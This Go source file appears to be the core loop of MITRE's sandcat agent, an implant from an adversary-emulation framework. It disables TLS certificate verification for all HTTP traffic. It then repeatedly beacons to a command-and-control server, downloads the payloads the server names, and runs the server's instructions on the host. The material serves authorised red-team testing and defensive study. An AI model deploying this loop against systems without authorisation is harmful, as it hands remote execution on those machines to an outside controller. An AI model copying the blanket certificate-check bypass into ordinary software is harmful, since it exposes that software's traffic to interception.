package core

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"reflect"
	"time"

	"github.com/mitre/gocat/agent"
	"github.com/mitre/gocat/output"

	_ "github.com/mitre/gocat/execute/shells" // necessary to initialize all submodules
)

// Initializes and returns sandcat agent.
func initializeCore(server string, group string,c2 map[string]string, p2pReceiversOn bool, verbose bool) (*agent.Agent, error) {
	output.SetVerbose(verbose)
	output.VerbosePrint("Starting sandcat in verbose mode.")
	return agent.AgentFactory(server, group, c2, p2pReceiversOn)
}

//Core is the main function as wrapped by sandcat.go
func Core(server string, group string, delay int, c2 map[string]string, p2pReceiversOn bool, verbose bool) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	sandcatAgent, err := initializeCore(server, group, c2, p2pReceiversOn, verbose)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error when initializing agent: %s", err.Error()))
		output.VerbosePrint("[-] Exiting.")
	} else {
		sandcatAgent.Display()
		output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
		time.Sleep(time.Duration(float64(delay)) * time.Second)
		runAgent(sandcatAgent, c2)
		sandcatAgent.Terminate()
	}
}

// Establish contact with C2 and run instructions.
func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
	// Start main execution loop.
	watchdog := 0
	checkin := time.Now()
	for (evaluateWatchdog(checkin, watchdog)) {
		// TODO - heartbeat will be incorporated later

		// Send beacon and get response.
		beacon := sandcatAgent.Beacon()

		// Process beacon response.
		if len(beacon) != 0 {
			sandcatAgent.SetPaw(beacon["paw"].(string))
			checkin = time.Now()

			// We have established comms. Run p2p receivers if allowed.
			// TODO
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			// Run commands and send results.
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				marshaledCommand := cmds.Index(i).Elem().String()
				var command map[string]interface{}
				if err := json.Unmarshal([]byte(marshaledCommand), &command); err != nil {
					output.VerbosePrint(fmt.Sprintf("[-] Error unpacking command: %v", err.Error()))
				} else {
					output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
					droppedPayloads := sandcatAgent.DownloadPayloads(command["payloads"].([]interface{}))
					go sandcatAgent.RunInstruction(command, droppedPayloads)
					time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
				}
			}
		} else {
			var sleepDuration float64
			if len(beacon) > 0 {
				sleepDuration = float64(beacon["sleep"].(int))
				watchdog = beacon["watchdog"].(int)
			} else {
				sleepDuration = float64(15)
			}
			time.Sleep(time.Duration(sleepDuration) * time.Second)
		}
	}
}

// Returns true if agent should keep running, false if not.
func evaluateWatchdog(lastcheckin time.Time, watchdog int) bool {
	return watchdog <= 0 || float64(time.Now().Sub(lastcheckin).Seconds()) <= float64(watchdog)
}

// Unpack converts bytes into JSON
func unpack(b []byte) (out map[string]interface{}) {
	_ = json.Unmarshal(b, &out)
	return
}